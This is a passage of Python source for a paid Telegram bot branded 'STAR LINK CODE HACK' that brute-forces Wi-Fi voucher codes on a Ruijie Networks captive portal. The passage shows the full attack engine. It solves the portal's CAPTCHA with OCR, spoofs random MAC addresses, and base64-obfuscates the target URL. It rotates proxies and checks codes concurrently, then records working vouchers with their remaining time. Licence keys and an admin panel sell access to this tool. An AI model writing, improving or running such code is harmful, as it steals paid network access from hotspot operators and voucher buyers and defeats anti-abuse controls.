        mode = call.data.replace("scan_", "")
        if chat_id not in user_data:
            user_data[chat_id] = {}
        if 'session_url' not in user_data[chat_id]:
            await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text="Portal URL အရင်ထည့်ပါ:\n\n/portal [url]", reply_markup=get_back_keyboard())
            await bot.answer_callback_query(call.id)
            return
        if mode in ["6", "7", "8"]:
            await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text="DIGIT " + mode + " အတွက် ထိပ်စီးနံပါတ်ရွေးပါ:", reply_markup=get_digit_keyboard(mode))
            await bot.answer_callback_query(call.id)
            return
        user_data[chat_id]['selected_mode'] = mode
        user_data[chat_id]['start_digit'] = None
        await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text="VOUCHER: " + mode + "\n\nSTART SCAN ကိုနှိပ်ပါ။", reply_markup=get_start_scam_keyboard())
        await bot.answer_callback_query(call.id)
        return

    if call.data.startswith("digit_"):
        parts = call.data.split("_")
        mode = parts[1]
        digit = parts[2]
        if chat_id not in user_data:
            user_data[chat_id] = {}
        user_data[chat_id]['selected_mode'] = mode
        if digit == "random":
            user_data[chat_id]['start_digit'] = None
            text = "Mode: " + mode + "\nRandom ဖြစ်ရှာမည်"
        else:
            user_data[chat_id]['start_digit'] = digit
            text = "Mode: " + mode + "\n" + digit + " မှ စ၍ရှာမည်"
        text = text + "\n\nSTART SCAN ကိုနှိပ်ပါ။"
        await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text=text, reply_markup=get_start_scam_keyboard())
        await bot.answer_callback_query(call.id)
        return

    if call.data == "menu_start_scam":
        if user_id not in paid_users and user_id not in approve:
            if is_admin(user_id, getattr(call.from_user, "username", None)):
                approve[chat_id] = True
                paid_users[user_id] = True
            else:
                await bot.answer_callback_query(call.id, "PAID USER မဟုတ်ပါ။")
                return
        if chat_id not in user_data or 'selected_mode' not in user_data.get(chat_id, {}):
            await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text="VOUCHER အရင်ရွေးပါ။", reply_markup=get_voucher_keyboard())
            await bot.answer_callback_query(call.id)
            return
        if chat_id not in user_data or 'session_url' not in user_data.get(chat_id, {}):
            await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text="Portal URL အရင်ထည့်ပါ:\n\n/portal [url]", reply_markup=get_back_keyboard())
            await bot.answer_callback_query(call.id)
            return
        mode = user_data[chat_id]['selected_mode']
        start_digit = user_data[chat_id].get('start_digit')
        if chat_id in scan_tasks and not scan_tasks[chat_id]["task"].done():
            await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text="Scan ရှိပြီးသား။", reply_markup=get_scam_button_keyboard())
            await bot.answer_callback_query(call.id)
            return
        await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text="Scanning...\n\nMode: " + mode, reply_markup=get_scam_button_keyboard())
        progress_msg = await bot.send_message(chat_id, "Scanning...\n\n")
        scan_id = str(uuid.uuid4())
        task = asyncio.create_task(run_bruteforce(mode, chat_id, user_data[chat_id]['session_url'], scan_id, message=call.message, progress_msg=progress_msg, start_digit=start_digit))
        scan_tasks[chat_id] = {"task": task, "stop": False, "scan_id": scan_id}
        await bot.answer_callback_query(call.id)
        return

    if call.data == "menu_stop":
        data = scan_tasks.get(chat_id)
        if data and not data["task"].done():
            data["stop"] = True
            data["scan_id"] = None
            await send_success_file(chat_id)
            data["task"].cancel()
            success_messages.pop(chat_id, None)
            success_texts.pop(chat_id, None)
            limited_messages.pop(chat_id, None)
            limited_texts.pop(chat_id, None)
            await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text="Scan Stopped", reply_markup=get_back_keyboard())
        else:
            await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text="Scan မရှိ။", reply_markup=get_back_keyboard())
        await bot.answer_callback_query(call.id)
        return

    if call.data == "menu_add_proxies":
        if user_id not in paid_users and user_id not in approve:
            if is_admin(user_id, getattr(call.from_user, "username", None)):
                approve[chat_id] = True
                paid_users[user_id] = True
            else:
                await bot.answer_callback_query(call.id, "PAID USER မဟုတ်ပါ။")
                return
        proxy_input_state[chat_id] = True
        proxy_count = db_count_proxies()
        text = "Add Proxies\n\n"
        text = text + "Current: " + str(proxy_count) + "\n\n"
        text = text + "Proxy များကို ရိုက်ထည့်ပါ:\n"
        text = text + "host:port\n"
        text = text + "user:pass@host:port\n\n"
        text = text + "တစ်လိုင်းတစ်ခု ရိုက်ပြီး ပို့ပါ။\n"
        text = text + "/cancel ဖြင့် ပယ်ဖျက်ပါ။"
        cancel_kb = InlineKeyboardMarkup(row_width=1)
        cancel_kb.add(InlineKeyboardButton("🔙 Cancel", callback_data="menu_add_proxies_cancel"))
        await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text=text, reply_markup=cancel_kb)
        await bot.answer_callback_query(call.id, "Proxy ရိုက်ထည့်ပါ...")
        return

    if call.data == "menu_add_proxies_cancel":
        proxy_input_state[chat_id] = False
        text = "STAR LINK CODE HACK\n\n" + user_name + "\n" + user_id
        await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text=text, reply_markup=get_main_keyboard(user_id))
        await bot.answer_callback_query(call.id, "Cancelled")
        return

    if call.data == "proxy_list":
        proxies = db_get_all_proxies()
        if not proxies:
            text = "Proxy မရှိ။"
        else:
            lines = []
            for i, p in enumerate(proxies[:30]):
                lines.append(str(i + 1) + ". " + p)
            text = "Proxies (" + str(len(proxies)) + ")\n\n" + "\n".join(lines)
        await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text=text, reply_markup=get_proxy_menu_keyboard())
        await bot.answer_callback_query(call.id)
        return

    if call.data == "proxy_clear":
        confirm_kb = InlineKeyboardMarkup(row_width=2)
        confirm_kb.add(
            InlineKeyboardButton("✅ Yes", callback_data="proxy_clear_confirm"),
            InlineKeyboardButton("❌ No", callback_data="menu_add_proxies")
        )
        await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text="Clear all proxies?", reply_markup=confirm_kb)
        await bot.answer_callback_query(call.id)
        return

    if call.data == "proxy_clear_confirm":
        count = db_delete_all_proxies()
        await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text="Cleared " + str(count) + " proxies", reply_markup=get_proxy_menu_keyboard())
        await bot.answer_callback_query(call.id)
        return

    if call.data.startswith("admin_"):
        if not is_admin(str(chat_id), getattr(call.from_user, "username", None)):
            await bot.answer_callback_query(call.id, "Admin မဟုတ်ပါ။")
            return
        if call.data == "admin_back":
            await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text="Admin Panel\n\nရွေးပါ:", reply_markup=get_admin_main_keyboard())
            await bot.answer_callback_query(call.id)
            return
        if call.data == "admin_genkey":
            await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text="Select Plan:", reply_markup=get_admin_genkey_keyboard())
            await bot.answer_callback_query(call.id)
            return
        plan_map = {"admin_gen_30m": "30m", "admin_gen_1h": "1h", "admin_gen_1d": "1d", "admin_gen_7d": "7d", "admin_gen_1m": "1m", "admin_gen_1y": "1y", "admin_gen_unlimited": "unlimited"}
        if call.data in plan_map:
            plan = plan_map[call.data]
            text = "Selected Plan: " + plan + "\n\nUsage:\n/genkey " + plan + " [limit] [user_id]"
            await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text=text, reply_markup=get_admin_back_keyboard())
            await bot.answer_callback_query(call.id)
            return
        if call.data == "admin_delkey":
            await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text="Delete Key:\n/delkey [key]", reply_markup=get_admin_back_keyboard())
            await bot.answer_callback_query(call.id)
            return
        if call.data == "admin_listkeys":
            await bot.answer_callback_query(call.id)
            await listkeys_command(call.message)
            return
        if call.data == "admin_stats":
            await bot.answer_callback_query(call.id)
            await stats_command(call.message)
            return
        if call.data == "admin_broadcast":
            await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text="Broadcast:\n/sendall [message]", reply_markup=get_admin_back_keyboard())
            await bot.answer_callback_query(call.id)
            return
        if call.data == "admin_users":
            await bot.answer_callback_query(call.id)
            await users_list_command(call.message)
            return
        return

    if call.data == "menu_proxy_on" or call.data == "menu_proxy_off":
        if user_id not in paid_users and user_id not in approve:
            await bot.answer_callback_query(call.id, "PAID USER မဟုတ်ပါ။")
            return
        current = db_get_proxy_setting(user_id)
        new_status = not current
        db_set_proxy_setting(user_id, new_status)
        status_text = "ON" if new_status else "OFF"
        text = "STAR LINK CODE HACK\n\n"
        text = text + "NAME: " + user_name + "\n"
        text = text + "USER ID: " + user_id + "\n\n"
        text = text + "Proxy Status: " + status_text
        await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text=text, reply_markup=get_main_keyboard(user_id))
        await bot.answer_callback_query(call.id, "Proxy " + status_text)
        return

    if call.data == "menu_back":
        if user_id in paid_users or user_id in approve:
            proxy_enabled = db_get_proxy_setting(user_id)
            status_text = "ON" if proxy_enabled else "OFF"
            text = "STAR LINK CODE HACK\n\n"
            text = text + "NAME: " + user_name + "\n"
            text = text + "USER ID: " + user_id + "\n\n"
            text = text + "PAID USER\n"
            text = text + "Proxy: " + status_text
        else:
            text = "STAR LINK CODE HACK\n\n"
            text = text + "NAME: " + user_name + "\n"
            text = text + "USER ID: " + user_id + "\n\n"
            text = text + "Registered မလုပ်ရသေးပါ။"
        await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text=text, reply_markup=get_main_keyboard(user_id))
        await bot.answer_callback_query(call.id)
        return

    if call.data == "menu_free_trial":
        if user_id not in paid_users and user_id not in approve:
            if is_admin(user_id, getattr(call.from_user, "username", None)):
                approve[chat_id] = True
                paid_users[user_id] = True
            else:
                await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text="Registered မလုပ်ရသေးပါ။", reply_markup=get_back_keyboard())
                await bot.answer_callback_query(call.id)
                return
        text = "Portal URL ထည့်ရန်:\n\n/portal [your_portal_url]"
        await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text=text, reply_markup=get_back_keyboard())
        await bot.answer_callback_query(call.id)
        return

    if call.data == "menu_paid":
        if is_admin(user_id, getattr(call.from_user, "username", None)):
            approve[chat_id] = True
            paid_users[user_id] = True
            await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text="Admin - KEY မလိုပါ။", reply_markup=get_back_keyboard())
            await bot.answer_callback_query(call.id)
            return
        text = "PAID USER ဖြစ်ရန်\n\nKEY ထည့်ပါ\n\nUSER ID: " + user_id
        await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text=text, reply_markup=get_paid_keyboard())
        await bot.answer_callback_query(call.id)
        return

    if call.data == "menu_enter_key":
        if is_admin(user_id, getattr(call.from_user, "username", None)):
            await bot.send_message(chat_id, "Admin - KEY မလိုပါ။")
            await bot.answer_callback_query(call.id)
            return
        await bot.send_message(chat_id, "/key [your_key]\n\nUSER ID: " + user_id)
        await bot.answer_callback_query(call.id)
        return

    if call.data == "menu_result":
        if user_id not in paid_users and user_id not in approve:
            await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text="Registered မလုပ်ရသေးပါ။", reply_markup=get_back_keyboard())
            await bot.answer_callback_query(call.id)
            return
        results = db_get_results(user_id)
        if results:
            codes = "\n".join(results)
            text = "Found Codes:\n" + codes
        else:
            text = "Success code မရှိသေးပါ။"
        await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text=text, reply_markup=get_back_keyboard())
        await bot.answer_callback_query(call.id)
        return

    if call.data == "menu_recheck":
        if user_id not in paid_users and user_id not in approve:
            await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text="Registered မလုပ်ရသေးပါ။", reply_markup=get_back_keyboard())
            await bot.answer_callback_query(call.id)
            return
        if chat_id not in user_data or 'session_url' not in user_data.get(chat_id, {}):
            await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text="Portal URL အရင်ထည့်ပါ:\n\n/portal [url]", reply_markup=get_back_keyboard())
            await bot.answer_callback_query(call.id)
            return
        await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text="Rechecking...", reply_markup=get_scam_button_keyboard())
        await recheck_command(call.message)
        await bot.answer_callback_query(call.id)
        return# ==================== SCANNING ENGINE ====================

def digit_generator(length):
    return "".join(random.choice(string.digits) for _ in range(length))

def engsmall_generator(length):
    chars = string.ascii_lowercase
    return "".join(random.choice(chars) for _ in range(length))

def engmixed_generator(length):
    chars = string.ascii_lowercase + string.digits
    return "".join(random.choice(chars) for _ in range(length))

def iter_codes(mode, start_digit=None):
    if mode in ["6", "7", "8"]:
        length = int(mode)
        if start_digit is not None:
            start = int(start_digit) * (10 ** (length - 1))
            end = (int(start_digit) + 1) * (10 ** (length - 1))
            for i in range(start, end):
                yield str(i).zfill(length)
            return
        if mode == "6":
            codes = [str(i).zfill(6) for i in range(10 ** 6)]
            random.shuffle(codes)
            yield from codes
            return
        if mode == "7":
            codes = [str(i).zfill(7) for i in range(10 ** 7)]
            random.shuffle(codes)
            yield from codes
            return
        if mode == "8":
            while True:
                yield digit_generator(8)
    if mode == "engsmall6":
        while True:
            yield engsmall_generator(6)
    if mode == "engsmall7":
        while True:
            yield engsmall_generator(7)
    if mode == "engsmall8":
        while True:
            yield engsmall_generator(8)
    if mode == "engmixed6":
        while True:
            yield engmixed_generator(6)
    if mode == "engmixed7":
        while True:
            yield engmixed_generator(7)
    if mode == "engmixed8":
        while True:
            yield engmixed_generator(8)
    raise ValueError("Unsupported mode: " + mode)

def format_progress(checked, total=None, speed=0, found=0, proxy_count=0):
    speed_str = str(int(speed)) + " codes/min"
    if total is not None and total > 0:
        bar_length = 20
        percent = min(100, (checked / total) * 100)
        filled = int(percent / 5)
        bar = "#" * filled + "-" * (bar_length - filled)
        text = "Scanning VOUCHER Codes...\n\n"
        text = text + "Checked: " + str(checked) + "/" + str(total) + "\n"
        text = text + "Progress: " + str(round(percent, 2)) + "%\n"
        text = text + "Speed: " + speed_str + "\n"
        text = text + "Success: " + str(found) + "\n"
        text = text + "Proxies: " + str(proxy_count) + "\n"
        text = text + "[" + bar + "]"
        return text
    text = "Scanning VOUCHER Codes...\n\n"
    text = text + "Checked: " + str(checked) + "\n"
    text = text + "Speed: " + speed_str + "\n"
    text = text + "Success: " + str(found) + "\n"
    text = text + "Proxies: " + str(proxy_count) + "\n"
    text = text + "Status: running"
    return text

_ocr = None

def get_ocr():
    global _ocr
    if _ocr is None:
        try:
            _ocr = ddddocr.DdddOcr(show_ad=False)
        except Exception:
            _ocr = None
    return _ocr

def _ocr_sync(image_bytes):
    ocr = get_ocr()
    if ocr is None:
        return None
    try:
        nparr = np.frombuffer(image_bytes, np.uint8)
        img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
        if img is None:
            return None
        gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
        blur = cv2.GaussianBlur(gray, (3, 3), 0)
        _, thresh = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
        _, buffer = cv2.imencode('.png', thresh)
        result = ocr.classification(buffer.tobytes())
        return result.upper()
    except Exception:
        return None

async def Captcha_Text(image_bytes):
    return await asyncio.to_thread(_ocr_sync, image_bytes)

async def Captcha_Image(session, session_id):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9',
        'referer': 'https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?sessionId=' + session_id,
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    params = {'sessionId': session_id, '_t': str(time.time())}
    async with session.get('https://portal-as.ruijienetworks.com/api/auth/captcha/image', params=params, headers=headers) as req:
        return await req.read()

async def Varify_Captcha(session, session_id, text):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/json',
        'origin': 'https://portal-as.ruijienetworks.com',
        'referer': 'https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?sessionId=' + session_id,
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    json_data = {'sessionId': session_id, 'authCode': text}
    async with session.post('https://portal-as.ruijienetworks.com/api/auth/captcha/verify', headers=headers, json=json_data) as req:
        data = await req.json()
        if data.get("success") == True:
            return session_id
        return None

def get_mac():
    first_byte = random.choice([0x02, 0x06, 0x0A, 0x0E])
    mac = [first_byte] + [random.randint(0x00, 0xff) for _ in range(5)]
    return ':'.join(f'{x:02x}' for x in mac)

def replace_mac(url, new_mac):
    return re.sub(r'(?<=mac=)[^&]+', new_mac, url)

async def get_session_id(session, session_url, previous_session_id=None):
    mac = get_mac()
    session_url = replace_mac(session_url, new_mac=mac)
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36',
    }
    try:
        async with session.get(session_url, headers=headers, allow_redirects=True) as req:
            response = str(req.url)
            session_id = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", response)
            if session_id:
                return session_id.group(1)
            return previous_session_id
    except Exception:
        return previous_session_id

def Minute_to_Hour(total_minutes):
    if total_minutes == 'Unknown':
        return 'Unknown'
    try:
        mins = int(total_minutes)
        if mins == 0:
            return "0m"
        hours = mins // 60
        rem_minutes = mins % 60
        if hours > 0 and rem_minutes > 0:
            return str(hours) + "h " + str(rem_minutes) + "m"
        elif hours > 0:
            return str(hours) + "h"
        else:
            return str(rem_minutes) + "m"
    except Exception:
        return 'Unknown'

async def Code_Expires_Date(active_id):
    paths = [
        'https://portal-as.ruijienetworks.com/api/macc2/balance/getBalance/' + active_id,
        'https://portal-as.ruijienetworks.com/api/macc/balance/getBalance/' + active_id,
        'https://portal-as.ruijienetworks.com/api/auth/balance/getBalance/' + active_id
    ]
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/json;',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    timeout = aiohttp.ClientTimeout(total=10)
    async with aiohttp.ClientSession(connector=_connector, connector_owner=False, cookie_jar=aiohttp.CookieJar(), timeout=timeout) as sess:
        for url in paths:
            try:
                async with sess.get(url, headers=headers) as req:
                    if req.status == 200:
                        data = await req.json()
                        if data.get('success'):
                            result = data.get('result', {})
                            raw_minutes = result.get('totalMinutes')
                            if raw_minutes is None:
                                raw_minutes = result.get('remainingMinutes')
                            profile_name = result.get('profileName', 'Unknown')
                            if raw_minutes is not None:
                                totaltime = Minute_to_Hour(raw_minutes)
                                display = "Plan: " + profile_name + " | Time: " + totaltime
                                return display, raw_minutes
            except Exception:
                continue
    return "Plan: Unknown | Time: Unknown", 'Unknown'

async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False, message=None):
    global _connector
    if not recheck:
        current_task = scan_tasks.get(chat_id)
        if not current_task or current_task.get("scan_id") != scan_id:
            return
    post_url = base64.b64decode(b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM=').decode()
    response = None
    for _attempt in range(2):
        timeout = aiohttp.ClientTimeout(total=TIMEOUT)
        async with aiohttp.ClientSession(connector=_connector, connector_owner=False, cookie_jar=aiohttp.CookieJar(), timeout=timeout) as task_session:
            session_id = await get_session_id(task_session, session_url, None)
            if not session_id:
                return
            auth_code = None
            for _ in range(5):
                try:
                    image = await Captcha_Image(task_session, session_id)
                    text = await Captcha_Text(image)
                    if not text:
                        continue
                    verified = await Varify_Captcha(task_session, session_id, text)
                    if verified:
                        auth_code = text
                        break
                except Exception:
                    pass
            if not auth_code:
                return
            if not recheck:
                current_task = scan_tasks.get(chat_id)
                if not current_task or current_task.get("scan_id") != scan_id or current_task.get("stop"):
                    return
            data = {"accessCode": code, "sessionId": session_id, "apiVersion": 1, "authCode": auth_code}
            headers = {
                "authority": "portal-as.ruijienetworks.com",
                "accept": "*/*",
                "content-type": "application/json",
                "origin": "https://portal-as.ruijienetworks.com",
                "referer": "https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?sessionId=" + session_id,
                "user-agent": "Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
            }
            try:
                async with task_session.post(post_url, json=data, headers=headers) as req:
                    response = await req.text()
                    print("[voucher] code=" + code + " status=" + str(req.status))
            except Exception:
                return
        if response and 'request limited' in response:
            continue
        break
    if not response:
        return
    if 'logonUrl' in response:
        if recheck:
            return code
        if chat_id not in success_texts:
            success_texts[chat_id] = []
        expire_date, raw_mins = await Code_Expires_Date(session_id)
        success_texts[chat_id].append("Code: " + code + "\n   " + expire_date)
        if chat_id not in user_data:
            user_data[chat_id] = {}
        current_display = user_data[chat_id].get('current_display_codes', [])
        current_display.append("Code: " + code + "\n   " + expire_date)
        code_line = "\n\n".join(current_display)
        results = db_get_results(str(chat_id))
        if code not in results:
            results.append(code)
            db_save_results(str(chat_id), results)
        user_info = db_get_user(str(chat_id))
        if user_info:
            key_info = db_get_key(user_info["key"])
            if key_info:
                db_update_used_codes(user_info["key"], key_info["used_codes"] + 1)
        if message:
            try:
                if chat_id not in success_messages or len(code_line) > 4000:
                    sent = await bot.send_message(chat_id=message.chat.id, text="Success Codes:\n\n" + code_line)
                    success_messages[chat_id] = sent.message_id
                    user_data[chat_id]['current_display_codes'] = current_display
                else:
                    await bot.edit_message_text(chat_id=message.chat.id, message_id=success_messages[chat_id], text="Success Codes:\n\n" + code_line)
            except Exception:
                try:
                    sent = await bot.send_message(chat_id=message.chat.id, text="Success Codes:\n\nCode: " + code)
                    success_messages[chat_id] = sent.message_id
                except Exception:
                    pass
    elif 'STA' in response:
        if chat_id not in limited_texts:
            limited_texts[chat_id] = []
        limited_texts[chat_id].append(code)
        limited_line = "\n".join(limited_texts[chat_id])
        if message:
            try:
                if chat_id not in limited_messages:
                    sent = await bot.send_message(chat_id=message.chat.id, text="Limited Codes:\n\n" + limited_line)
                    limited_messages[chat_id] = sent.message_id
                else:
                    await bot.edit_message_text(chat_id=message.chat.id, message_id=limited_messages[chat_id], text="Limited Codes:\n\n" + limited_line)
            except Exception:
                pass

async def run_bruteforce(mode, chat_id, session_url, scan_id, message=None, progress_msg=None, start_digit=None):
    global _voucher_sem
    try:
        code_iter = iter_codes(mode, start_digit=start_digit)
    except ValueError as e:
        await bot.send_message(chat_id, str(e))
        return
    if mode in ["6", "7"]:
        total = 10 ** int(mode)
    elif mode == "8":
        total = 10 ** 8
    else:
        total = None
    checked = 0
    last_key_check = time.monotonic()
    scan_start = time.monotonic()
    if _voucher_sem is None:
        _voucher_sem = asyncio.Semaphore(MAX_CONCURRENT)
    try:
        while True:
            current_task = scan_tasks.get(chat_id)
            if not current_task or current_task.get("scan_id") != scan_id:
                return
            if current_task.get("stop"):
                scan_tasks.pop(chat_id, None)
                success_messages.pop(chat_id, None)
                success_texts.pop(chat_id, None)
                return
            batch = []
            for _ in range(BATCH_SIZE):
                try:
                    batch.append(next(code_iter))
                except StopIteration:
                    break
            if not batch:
                break
            if time.monotonic() - last_key_check >= 600:
                user_info = db_get_user(str(chat_id))
                if user_info:
                    key_info = db_get_key(user_info["key"])
                    if not key_info or not check_key_expiration(key_info["expires_at"]):
                        approve[chat_id] = False
                        paid_users.pop(str(chat_id), None)
                        await bot.send_message(chat_id, "Key expired.")
                        scan_tasks.pop(chat_id, None)
                        return
                last_key_check = time.monotonic()

            async def _check(code):
                async with _voucher_sem:
                    return await perform_check(session_url, code, chat_id, scan_id, message=message)

            await asyncio.gather(*[_check(code) for code in batch], return_exceptions=True)
            checked += len(batch)
            found = len(success_texts.get(chat_id, []))
            elapsed = time.monotonic() - scan_start
            speed = (checked / elapsed * 60) if elapsed > 0 else 0
            proxy_count = db_count_proxies()
            text = format_progress(checked, total, speed, found, proxy_count)
            try:
                await bot.edit_message_text(chat_id=chat_id, message_id=progress_msg.message_id, text=text)
            except Exception:
                try:
                    new_msg = await bot.send_message(chat_id, text)
                    progress_msg.message_id = new_msg.message_id
                except Exception:
                    pass
        found = len(success_texts.get(chat_id, []))
        finish_text = "Scanning Completed\n\nChecked: " + str(checked) + "\nSuccess: " + str(found)
        try:
            await bot.edit_message_text(chat_id=chat_id, message_id=progress_msg.message_id, text=finish_text)
        except Exception:
            try:
                await bot.send_message(chat_id, finish_text)
            except Exception:
                pass
        await send_success_file(chat_id)
    except asyncio.CancelledError:
        await send_success_file(chat_id)
        raise
    finally:
        scan_tasks.pop(chat_id, None)
        success_messages.pop(chat_id, None)
        success_texts.pop(chat_id, None)
        limited_messages.pop(chat_id, None)
        limited_texts.pop(chat_id, None)

async def send_success_file(chat_id):
    if chat_id in success_texts and success_texts[chat_id]:
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = "success_codes_" + str(chat_id) + "_" + timestamp + ".txt"
            content = "\n\n".join(success_texts[chat_id])
            with open(filename, "w", encoding="utf-8") as f:
                f.write("Success Codes\n")
                f.write("User: " + str(chat_id) + "\n")
                f.write("Date: " + datetime.now().strftime("%Y-%m-%d %H:%M:%S") + "\n")
                f.write("Total: " + str(len(success_texts[chat_id])) + "\n")
                f.write("=" * 50 + "\n\n")
                f.write(content)
            with open(filename, "rb") as f:
                await bot.send_document(chat_id, f, caption="Found " + str(len(success_texts[chat_id])) + " codes")
            os.remove(filename)
        except Exception as e:
            print("File error: " + str(e))

async def handle_web(request):
    return web.Response(text="Bot running 24/7")

async def web_server():
    app = web.Application()
    app.router.add_get('/', handle_web)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get('PORT', '8099'))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()

async def start_polling():
    backoff = 5
    while True:
        try:
            await bot.infinity_polling(timeout=60, request_timeout=60)
            return
        except Exception as e:
            print("Polling error: " + str(e))
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, 60)

async def main():
    global _connector
    timeout = aiohttp.ClientTimeout(total=TIMEOUT)
    _connector = aiohttp.TCPConnector(limit=CONNECTION_LIMIT, limit_per_host=CONNECTION_PER_HOST, ttl_dns_cache=300, ssl=False)
    try:
        asyncio.create_task(web_server())
        await start_polling()
    finally:
        await _connector.close()

if __name__ == '__main__':
    asyncio.run(main())